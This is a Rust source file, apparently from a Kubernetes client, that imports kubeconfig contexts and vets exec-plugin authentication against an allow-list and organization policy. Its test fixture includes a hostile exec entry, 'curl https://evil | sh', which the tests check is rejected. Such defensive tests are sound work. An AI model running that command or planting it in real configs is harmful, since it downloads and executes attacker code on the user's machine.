//! Импорт контекстов kubeconfig (спец. §5.5). Данные копируются в момент импорта: токены и
//! ключи — в keychain, CA, сертификат и строка запуска exec-плагина — в профиль; связи с файлом нет.

use std::path::{Path, PathBuf};

use base64::Engine;
use base64::engine::general_purpose::STANDARD;
use kube::config::{AuthInfo, Cluster, ExecConfig, ExecInteractiveMode, Kubeconfig};
use secrecy::ExposeSecret;
use serde::Serialize;

use crate::error::{AppError, AppResult, ErrorCode};
use crate::i18n::LocalizedText;
use crate::policy::PolicyStatus;
use crate::storage::profile::{
    AuthConfig, CaConfig, ConnectionProfile, EXEC_API_V1, EXEC_API_V1BETA1, Environment, ExecAuth,
    ExecEnv, ProxyConfig, is_valid_namespace, normalize_profile, pem_certificates,
};

/// Поиск команды exec-плагина: имя из kubeconfig и каталог файла → абсолютный путь.
pub type ResolveCommand<'a> = &'a dyn Fn(&str, Option<&Path>) -> Option<PathBuf>;

/// Как подключение будет входить после импорта.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
pub enum ImportAuth {
    Token,
    ClientCert,
    /// Учётных данных в файле нет (или логин и пароль): вход через браузер.
    Browser,
    /// Exec-плагин из списка разрешённых (спец. §5.2).
    Exec,
}

#[derive(Debug, Clone, PartialEq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct KubeContext {
    pub name: String,
    pub cluster: String,
    pub server: String,
    pub user: String,
    pub namespace: Option<String>,
    pub auth: ImportAuth,
    pub insecure: bool,
    pub current: bool,
    /// Строка запуска exec-плагина с абсолютным путём к команде — человек подтверждает её
    /// при импорте.
    pub exec: Option<ExecAuth>,
    /// Почему контекст нельзя импортировать; `None` — можно.
    pub unsupported: Option<LocalizedText>,
    /// Подключение с тем же адресом и именем: импорт обновит его.
    pub existing_id: Option<String>,
}

#[derive(Debug, Clone, PartialEq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct KubeconfigPreview {
    pub path: String,
    pub contexts: Vec<KubeContext>,
}

/// Подключение из контекста и его секреты.
#[derive(Debug, Clone)]
pub struct ImportedContext {
    pub profile: ConnectionProfile,
    pub token: Option<String>,
    pub client_key: Option<String>,
}

/// Файл по умолчанию: первый путь из `$KUBECONFIG`, иначе `~/.kube/config`.
pub fn default_path(env: crate::k8s::config::EnvLookup, home: Option<PathBuf>) -> Option<PathBuf> {
    if let Some(list) = env("KUBECONFIG").filter(|v| !v.trim().is_empty()) {
        return std::env::split_paths(&list).next();
    }
    home.map(|h| h.join(".kube").join("config"))
}

pub fn read(path: &Path) -> AppResult<Kubeconfig> {
    Kubeconfig::read_from(path).map_err(|e| {
        app_err!(
            ErrorCode::InvalidInput,
            "errors.kubeconfig.unreadable",
            "Cannot read kubeconfig {{path}}: {{error}}",
            path = path.display(),
            error = e
        )
    })
}

fn cluster<'a>(kc: &'a Kubeconfig, name: &str) -> Option<&'a Cluster> {
    kc.clusters
        .iter()
        .find(|c| c.name == name)
        .and_then(|c| c.cluster.as_ref())
}

fn user<'a>(kc: &'a Kubeconfig, name: &str) -> Option<&'a AuthInfo> {
    kc.auth_infos
        .iter()
        .find(|u| u.name == name)
        .and_then(|u| u.auth_info.as_ref())
}

/// Exec-плагин из kubeconfig: команда из списка разрешённых, найденная по абсолютному пути.
fn exec_auth(
    exec: &ExecConfig,
    base: Option<&Path>,
    resolve: ResolveCommand,
) -> Result<ExecAuth, LocalizedText> {
    if exec.interactive_mode == Some(ExecInteractiveMode::Always) {
        return Err(ltext!(
            "errors.kubeconfig.execInteractive",
            "The exec plugin needs a terminal (interactiveMode: Always) — not supported"
        ));
    }
    let command = exec.command.clone().unwrap_or_default();
    let args = exec.args.clone().unwrap_or_default();
    crate::auth::exec::check_allowed(&command, &args)?;
    let api_version = exec
        .api_version
        .clone()
        .unwrap_or_else(|| EXEC_API_V1.to_string());
    if api_version != EXEC_API_V1 && api_version != EXEC_API_V1BETA1 {
        return Err(ltext!(
            "errors.exec.badApiVersion",
            "Unsupported exec plugin API version “{{version}}”: use {{expected}}",
            version = api_version,
            expected = EXEC_API_V1
        ));
    }
    let path = resolve(&command, base).ok_or_else(|| {
        ltext!(
            "errors.kubeconfig.execNotFound",
            "Command “{{command}}” is not found in PATH or the standard folders — install it or specify the full path in kubeconfig",
            command = command
        )
    })?;
    let env = exec
        .env
        .iter()
        .flatten()
        .filter_map(|m| {
            Some(ExecEnv {
                name: m.get("name")?.clone(),
                value: m.get("value").cloned().unwrap_or_default(),
            })
        })
        .collect();
    Ok(ExecAuth {
        command: path.display().to_string(),
        args,
        env,
        api_version,
        provide_cluster_info: exec.provide_cluster_info,
        approved: None,
    })
}

/// Способ входа, строка запуска exec-плагина и причина, по которой контекст не импортируется.
fn classify(
    u: Option<&AuthInfo>,
    base: Option<&Path>,
    resolve: ResolveCommand,
) -> (ImportAuth, Option<ExecAuth>, Option<LocalizedText>) {
    let Some(u) = u else {
        return (ImportAuth::Browser, None, None);
    };
    if let Some(exec) = &u.exec {
        return match exec_auth(exec, base, resolve) {
            Ok(e) => (ImportAuth::Exec, Some(e), None),
            Err(reason) => (ImportAuth::Exec, None, Some(reason)),
        };
    }
    if let Some(p) = &u.auth_provider {
        return (
            ImportAuth::Browser,
            None,
            Some(ltext!(
                "errors.kubeconfig.authProvider",
                "Authentication provider “{{name}}” is outdated and not supported — use an exec plugin",
                name = p.name
            )),
        );
    }
    if u.token.is_some() || u.token_file.is_some() {
        return (ImportAuth::Token, None, None);
    }
    if u.client_certificate.is_some() || u.client_certificate_data.is_some() {
        return (ImportAuth::ClientCert, None, None);
    }
    (ImportAuth::Browser, None, None)
}

/// Контексты файла для предпросмотра. `existing` — уже сохранённые подключения, `resolve` ищет
/// команды exec-плагинов.
pub fn preview(
    kc: &Kubeconfig,
    path: &Path,
    existing: &[ConnectionProfile],
    policy: &PolicyStatus,
    resolve: ResolveCommand,
) -> KubeconfigPreview {
    let contexts = kc
        .contexts
        .iter()
        .map(|nc| {
            let ctx = nc.context.clone().unwrap_or_default();
            let user_name = ctx.user.clone().unwrap_or_default();
            let cl = cluster(kc, &ctx.cluster);
            let server = cl
                .and_then(|c| c.server.clone())
                .unwrap_or_default()
                .trim_end_matches('/')
                .to_string();
            let insecure = cl.and_then(|c| c.insecure_skip_tls_verify).unwrap_or(false);
            let (auth, exec, mut unsupported) = classify(user(kc, &user_name), path.parent(), resolve);
            if cl.is_none() {
                unsupported = Some(ltext!(
                    "errors.kubeconfig.noCluster",
                    "The context refers to a missing cluster “{{name}}”",
                    name = ctx.cluster
                ));
            } else if insecure && !policy.allow_insecure_tls {
                unsupported = Some(ltext!(
                    "errors.connections.insecureForbidden",
                    "Connections without TLS certificate verification are forbidden by your organization"
                ));
            } else if auth == ImportAuth::Exec && !policy.allow_exec_auth {
                unsupported = Some(ltext!(
                    "errors.connections.execForbidden",
                    "Connections with exec plugins are forbidden by your organization"
                ));
            }
            KubeContext {
                existing_id: existing
                    .iter()
                    .find(|p| p.name == nc.name && p.api_url == server)
                    .map(|p| p.id.clone()),
                name: nc.name.clone(),
                cluster: ctx.cluster.clone(),
                server,
                user: user_name,
                namespace: ctx.namespace.clone(),
                auth,
                insecure,
                current: kc.current_context.as_deref() == Some(nc.name.as_str()),
                exec,
                unsupported,
            }
        })
        .collect();
    KubeconfigPreview {
        path: path.display().to_string(),
        contexts,
    }
}

fn file_text(path: &str) -> AppResult<String> {
    std::fs::read_to_string(path).map_err(|e| {
        app_err!(
            ErrorCode::InvalidInput,
            "errors.kubeconfig.fileUnreadable",
            "Cannot read {{path}} referenced by kubeconfig: {{error}}",
            path = path,
            error = e
        )
    })
}

fn decoded(data: &str) -> AppResult<String> {
    STANDARD
        .decode(data.trim())
        .ok()
        .and_then(|b| String::from_utf8(b).ok())
        .ok_or_else(|| {
            app_err!(
                ErrorCode::InvalidInput,
                "errors.kubeconfig.badBase64",
                "Certificate or key data in kubeconfig is not valid base64"
            )
        })
}

/// Данные из `*-data` (base64) или из файла по пути.
fn data_or_file(data: Option<&str>, path: Option<&str>) -> AppResult<Option<String>> {
    match (data, path) {
        (Some(d), _) => decoded(d).map(Some),
        (None, Some(p)) => file_text(p).map(Some),
        (None, None) => Ok(None),
    }
}

/// Подключение из контекста `name`. Ошибка — если контекст не поддерживается или данные
/// не читаются.
pub fn import_context(
    kc: &Kubeconfig,
    name: &str,
    preview: &KubeContext,
) -> AppResult<ImportedContext> {
    if let Some(reason) = &preview.unsupported {
        return Err(AppError::localized(ErrorCode::InvalidInput, reason.clone()));
    }
    let nc = kc.contexts.iter().find(|c| c.name == name).ok_or_else(|| {
        app_err!(
            ErrorCode::NotFound,
            "errors.kubeconfig.noContext",
            "Context “{{name}}” not found in kubeconfig",
            name = name
        )
    })?;
    let ctx = nc.context.clone().unwrap_or_default();
    let cl = cluster(kc, &ctx.cluster).cloned().unwrap_or_default();
    let u = ctx.user.as_deref().and_then(|n| user(kc, n));

    let ca = if cl.insecure_skip_tls_verify.unwrap_or(false) {
        CaConfig::Insecure
    } else {
        match data_or_file(
            cl.certificate_authority_data.as_deref(),
            cl.certificate_authority.as_deref(),
        )? {
            Some(pem) => {
                pem_certificates(&pem).map_err(|_| {
                    app_err!(
                        ErrorCode::InvalidInput,
                        "errors.connections.caPemInvalid",
                        "The CA certificate must be in PEM format (-----BEGIN CERTIFICATE-----)"
                    )
                })?;
                CaConfig::Pem { pem }
            }
            None => CaConfig::System,
        }
    };
    let mut token = None;
    let mut client_key = None;
    let auth = match preview.auth {
        ImportAuth::Token => {
            let u = u.expect("token auth has a user");
            token = Some(match (&u.token, &u.token_file) {
                (Some(t), _) => t.expose_secret().trim().to_string(),
                (None, Some(f)) => file_text(f)?.trim().to_string(),
                (None, None) => String::new(),
            });
            AuthConfig::Token
        }
        ImportAuth::ClientCert => {
            let u = u.expect("cert auth has a user");
            let cert = data_or_file(
                u.client_certificate_data.as_deref(),
                u.client_certificate.as_deref(),
            )?
            .unwrap_or_default();
            client_key = data_or_file(
                u.client_key_data.as_ref().map(|k| k.expose_secret()),
                u.client_key.as_deref(),
            )?;
            AuthConfig::ClientCert {
                certificate_pem: cert,
            }
        }
        ImportAuth::Browser => AuthConfig::Browser,
        ImportAuth::Exec => AuthConfig::Exec(
            preview
                .exec
                .clone()
                .ok_or_else(|| AppError::internal_with("exec context without a launch line"))?,
        ),
    };
    let mut profile = ConnectionProfile {
        id: preview
            .existing_id
            .clone()
            .unwrap_or_else(|| uuid::Uuid::new_v4().to_string()),
        name: nc.name.clone(),
        color: "#3b82f6".into(),
        environment: Environment::Dev,
        read_only: false,
        api_url: cl.server.clone().unwrap_or_default(),
        auth,
        ca,
        tls_server_name: cl.tls_server_name.clone(),
        proxy: match cl.proxy_url.as_deref().map(str::trim) {
            Some(u) if !u.is_empty() => ProxyConfig::Url { url: u.to_string() },
            _ => ProxyConfig::System,
        },
        favorite_namespaces: ctx
            .namespace
            .clone()
            .filter(|n| is_valid_namespace(n))
            .into_iter()
            .collect(),
        manual_namespaces: Vec::new(),
        request_timeout_ms: 30_000,
        connect_timeout_ms: 10_000,
        folder_id: None,
        order: 0,
        extra: Default::default(),
    };
    normalize_profile(&mut profile);
    crate::storage::profile::validate_profile(&profile)?;
    Ok(ImportedContext {
        profile,
        token,
        client_key,
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::storage::profile::{TEST_CERT_PEM, sample_profile};

    fn kc(yaml: &str) -> Kubeconfig {
        Kubeconfig::from_yaml(yaml).unwrap()
    }

    /// Команды exec-плагинов «на этой машине»: только `kubelogin` и `aws`.
    fn installed(cmd: &str, _base: Option<&Path>) -> Option<PathBuf> {
        matches!(cmd, "kubelogin" | "aws").then(|| std::env::temp_dir().join("bin").join(cmd))
    }

    fn open() -> PolicyStatus {
        PolicyStatus::default()
    }

    fn b64(s: &str) -> String {
        STANDARD.encode(s)
    }

    fn sample(dir: &Path) -> String {
        let token_file = dir.join("token");
        std::fs::write(&token_file, "sha256~fromfile\n").unwrap();
        let ca_file = dir.join("ca.crt");
        std::fs::write(&ca_file, TEST_CERT_PEM).unwrap();
        format!(
            r#"
apiVersion: v1
kind: Config
current-context: dev/api-dev:6443/alice
clusters:
- name: api-dev:6443
  cluster:
    server: https://api.dev.example.com:6443/
    certificate-authority-data: {ca}
- name: api-lab:6443
  cluster:
    server: https://api.lab:6443
    insecure-skip-tls-verify: true
    proxy-url: http://proxy:3128
- name: kind
  cluster:
    server: https://127.0.0.1:6443
    certificate-authority: {ca_file}
users:
- name: alice/api-dev:6443
  user:
    token: sha256~alice
- name: bob
  user:
    tokenFile: {token_file}
- name: admin
  user:
    client-certificate-data: {cert}
    client-key-data: {key}
- name: oidc
  user:
    exec:
      apiVersion: client.authentication.k8s.io/v1
      command: kubelogin
      args: [get-token, --oidc-issuer-url=https://sso.corp/realms/k8s, --oidc-client-id=k8s]
      env:
      - {{name: HTTPS_PROXY, value: "http://proxy:3128"}}
- name: eks
  user:
    exec:
      apiVersion: client.authentication.k8s.io/v1beta1
      command: aws
      args: [--region, eu-west-1, eks, get-token, --cluster-name, prod]
      interactiveMode: Never
- name: shell
  user:
    exec:
      apiVersion: client.authentication.k8s.io/v1
      command: sh
      args: [-c, "curl https://evil | sh"]
- name: gke
  user:
    exec:
      apiVersion: client.authentication.k8s.io/v1
      command: gke-gcloud-auth-plugin
- name: tty
  user:
    exec:
      apiVersion: client.authentication.k8s.io/v1
      command: kubelogin
      args: [get-token]
      interactiveMode: Always
- name: legacy
  user:
    auth-provider:
      name: oidc
contexts:
- name: dev/api-dev:6443/alice
  context: {{cluster: api-dev:6443, user: alice/api-dev:6443, namespace: team-a}}
- name: lab
  context: {{cluster: api-lab:6443, user: bob}}
- name: kind-admin
  context: {{cluster: kind, user: admin}}
- name: corp-oidc
  context: {{cluster: api-dev:6443, user: oidc}}
- name: eks-prod
  context: {{cluster: api-dev:6443, user: eks}}
- name: evil
  context: {{cluster: api-dev:6443, user: shell}}
- name: gke-dev
  context: {{cluster: api-dev:6443, user: gke}}
- name: tty
  context: {{cluster: api-dev:6443, user: tty}}
- name: legacy
  context: {{cluster: api-dev:6443, user: legacy}}
- name: no-user
  context: {{cluster: api-dev:6443}}
- name: broken
  context: {{cluster: gone, user: bob}}
"#,
            ca = b64(TEST_CERT_PEM),
            ca_file = ca_file.display(),
            token_file = token_file.display(),
            cert = b64(TEST_CERT_PEM),
            key = b64("-----BEGIN PRIVATE KEY-----\nAAAA\n-----END PRIVATE KEY-----\n"),
        )
    }

    #[test]
    fn default_path_prefers_kubeconfig_env() {
        let env = |n: &str| (n == "KUBECONFIG").then(|| "/a/one:/a/two".to_string());
        let home = Some(PathBuf::from("/home/u"));
        if cfg!(unix) {
            assert_eq!(
                default_path(&env, home.clone()),
                Some(PathBuf::from("/a/one"))
            );
        }
        assert_eq!(
            default_path(&|_| None, home),
            Some(PathBuf::from("/home/u/.kube/config"))
        );
    }

    #[test]
    fn preview_classifies_contexts() {
        let dir = tempfile::tempdir().unwrap();
        let k = kc(&sample(dir.path()));
        let mut existing = sample_profile("old");
        existing.name = "lab".into();
        existing.api_url = "https://api.lab:6443".into();
        let p = preview(&k, dir.path(), &[existing], &open(), &installed);
        let by = |n: &str| p.contexts.iter().find(|c| c.name == n).unwrap().clone();
        let dev = by("dev/api-dev:6443/alice");
        assert_eq!(dev.auth, ImportAuth::Token);
        assert!(dev.current);
        assert_eq!(dev.server, "https://api.dev.example.com:6443");
        assert_eq!(dev.namespace.as_deref(), Some("team-a"));
        assert!(dev.unsupported.is_none());
        let lab = by("lab");
        assert!(lab.insecure);
        assert_eq!(lab.existing_id.as_deref(), Some("old"));
        assert_eq!(by("kind-admin").auth, ImportAuth::ClientCert);
        let oidc = by("corp-oidc");
        assert_eq!(
            (oidc.auth, oidc.unsupported.clone()),
            (ImportAuth::Exec, None)
        );
        let exec = oidc.exec.unwrap();
        assert_eq!(
            exec.command,
            installed("kubelogin", None).unwrap().display().to_string()
        );
        assert_eq!(exec.args[0], "get-token");
        assert_eq!(exec.env[0].name, "HTTPS_PROXY");
        assert_eq!(exec.approved, None, "подтверждает человек в диалоге");
        let eks = by("eks-prod").exec.unwrap();
        assert_eq!(eks.api_version, "client.authentication.k8s.io/v1beta1");
        for (name, key) in [
            ("evil", "errors.exec.notAllowed"),
            ("gke-dev", "errors.kubeconfig.execNotFound"),
            ("tty", "errors.kubeconfig.execInteractive"),
            ("legacy", "errors.kubeconfig.authProvider"),
        ] {
            assert_eq!(by(name).unsupported.unwrap().key, key, "{name}");
        }
        assert_eq!(by("no-user").auth, ImportAuth::Browser);
        assert_eq!(
            by("broken").unsupported.unwrap().key,
            "errors.kubeconfig.noCluster"
        );

        let policy = PolicyStatus {
            allow_insecure_tls: false,
            allow_exec_auth: false,
            ..PolicyStatus::default()
        };
        let strict = preview(&k, dir.path(), &[], &policy, &installed);
        let key = |n: &str| {
            let c = strict.contexts.iter().find(|c| c.name == n).unwrap();
            c.unsupported.as_ref().unwrap().key.clone()
        };
        assert_eq!(key("lab"), "errors.connections.insecureForbidden");
        assert_eq!(key("corp-oidc"), "errors.connections.execForbidden");
    }

    #[test]
    fn import_copies_data_and_secrets() {
        let dir = tempfile::tempdir().unwrap();
        let k = kc(&sample(dir.path()));
        let p = preview(&k, dir.path(), &[], &open(), &installed);
        let get = |n: &str| {
            let c = p.contexts.iter().find(|c| c.name == n).unwrap();
            import_context(&k, n, c)
        };

        let dev = get("dev/api-dev:6443/alice").unwrap();
        assert_eq!(dev.profile.api_url, "https://api.dev.example.com:6443");
        assert_eq!(dev.profile.auth, AuthConfig::Token);
        assert_eq!(
            dev.profile.ca,
            CaConfig::Pem {
                pem: TEST_CERT_PEM.into()
            }
        );
        assert_eq!(dev.profile.favorite_namespaces, vec!["team-a"]);
        assert_eq!(dev.profile.environment, Environment::Dev);
        assert_eq!(dev.token.as_deref(), Some("sha256~alice"));
        assert!(dev.client_key.is_none());

        let lab = get("lab").unwrap();
        assert_eq!(lab.profile.ca, CaConfig::Insecure);
        assert_eq!(
            lab.profile.proxy,
            ProxyConfig::Url {
                url: "http://proxy:3128".into()
            }
        );
        assert_eq!(lab.token.as_deref(), Some("sha256~fromfile"));

        let kind = get("kind-admin").unwrap();
        assert_eq!(
            kind.profile.auth,
            AuthConfig::ClientCert {
                certificate_pem: TEST_CERT_PEM.into()
            }
        );
        assert!(
            kind.client_key
                .unwrap()
                .starts_with("-----BEGIN PRIVATE KEY-----")
        );
        assert_eq!(
            kind.profile.ca,
            CaConfig::Pem {
                pem: TEST_CERT_PEM.into()
            },
            "CA из файла по пути"
        );

        assert_eq!(get("no-user").unwrap().profile.auth, AuthConfig::Browser);
        let oidc = get("corp-oidc").unwrap();
        let AuthConfig::Exec(e) = &oidc.profile.auth else {
            panic!("exec")
        };
        assert!(e.command.ends_with("kubelogin"));
        assert!(oidc.token.is_none() && oidc.client_key.is_none());
        assert_eq!(get("evil").unwrap_err().key, "errors.exec.notAllowed");
    }

    #[test]
    fn existing_profile_keeps_its_id_and_bad_data_is_an_error() {
        let dir = tempfile::tempdir().unwrap();
        let k = kc(&sample(dir.path()));
        let mut existing = sample_profile("old");
        existing.name = "lab".into();
        existing.api_url = "https://api.lab:6443".into();
        let p = preview(&k, dir.path(), &[existing], &open(), &installed);
        let lab = p.contexts.iter().find(|c| c.name == "lab").unwrap();
        assert_eq!(import_context(&k, "lab", lab).unwrap().profile.id, "old");

        let bad = kc(r#"
clusters:
- name: c
  cluster: {server: "https://api.c:6443", certificate-authority-data: "%%%"}
users:
- name: u
  user: {token: t}
contexts:
- name: x
  context: {cluster: c, user: u}
"#);
        let p = preview(&bad, dir.path(), &[], &open(), &installed);
        assert_eq!(
            import_context(&bad, "x", &p.contexts[0]).unwrap_err().key,
            "errors.kubeconfig.badBase64"
        );
    }

    #[test]
    fn unreadable_file_is_an_input_error() {
        let e = read(Path::new("/no/such/kubeconfig")).unwrap_err();
        assert_eq!(e.key, "errors.kubeconfig.unreadable");
    }
}
